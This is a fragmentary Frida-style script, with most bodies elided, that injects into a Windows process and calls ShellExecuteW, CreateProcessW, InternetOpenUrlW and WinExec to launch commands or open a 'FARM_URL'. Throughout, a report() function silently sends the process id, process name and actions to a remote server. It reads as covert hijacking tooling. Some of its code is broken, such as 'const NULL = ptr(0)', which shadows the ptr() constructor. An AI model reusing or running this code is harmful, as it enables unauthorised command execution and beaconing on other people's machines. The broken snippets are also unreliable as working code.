...
function report(action, data) {
    try {
        ...
        http.send(JSON.stringify({ action, farmUrl: FARM_URL, pid: Process.id || 0, processName: Process.name || '', timestamp: Date.now(), ...data }));
    } catch (e) {}
}
function tryShellExecuteW(url) {
    try {
        const ptr = Module.findExportByName('shell32.dll', 'ShellExecuteW');
        if (!ptr) return false;
        const func = new NativeFunction(ptr, 'pointer', ['pointer', 'pointer', 'pointer', 'pointer', 'pointer', 'int']);
        const NULL = ptr(0);
...
function tryCreateProcess(cmdLine) {
    try {
        const ptr = Module.findExportByName('kernel32.dll', 'CreateProcessW');
        if (!ptr) return false;
        const func = new NativeFunction(ptr, 'int', ['pointer', 'pointer', 'pointer', 'pointer', 'int', 'int', 'pointer', 'pointer', 'pointer', 'pointer']);
        const si = Memory.alloc(68);
        si.writeU32(68);
        const pi = Memory.alloc(8);
        const cmd = Memory.allocUtf16String(cmdLine);
...
function tryInternetOpenUrl() {
    try {
        const ptr = Module.findExportByName('wininet.dll', 'InternetOpenUrlW');
        if (!ptr) return false;
        const internet = Module.findExportByName('wininet.dll', 'InternetOpenW');
        if (!internet) return false;
        const openFunc = new NativeFunction(internet, 'pointer', ['pointer', 'int', 'pointer', 'pointer', 'int']);
        const hInternet = openFunc(Memory.allocUtf16String('FarmOpener'), 0, NULL, NULL, 0);
        if (!hInternet || hInternet.isNull()) return false;
        const urlFunc = new NativeFunction(ptr, 'pointer', ['pointer', 'pointer', 'pointer', 'int', 'int', 'pointer']);
...
function main() {
    ...
    try {
        const ptr = Module.findExportByName('kernel32.dll', 'WinExec');
        if (ptr) {
            const func = new NativeFunction(ptr, 'int', ['pointer', 'int']);
